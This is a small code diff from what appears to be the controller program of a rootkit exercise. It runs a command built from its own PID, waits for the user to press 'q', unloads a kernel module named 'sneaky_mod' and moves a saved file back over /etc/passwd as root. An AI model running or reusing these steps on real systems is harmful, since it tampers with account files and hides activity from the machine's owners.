@@ -16,15 +16,14 @@ int main(void){
     strcat(command, pidstr);
     strcat(command, "\"");
     system(command);
-    system("ls");
-    
-/*
     int c;
-    while((c=getchar())!='q'){
-      printf("%c",c);
+    while(1){
+      c=getchar();
+      if(c=='q'){
+	break;
+      }
     }
-*/
     system("rmmod sneaky_mod");
-    system("cp -f /tmp/passwd /etc");
+    system("mv -f /tmp/passwd /etc");
     return EXIT_SUCCESS;
 }
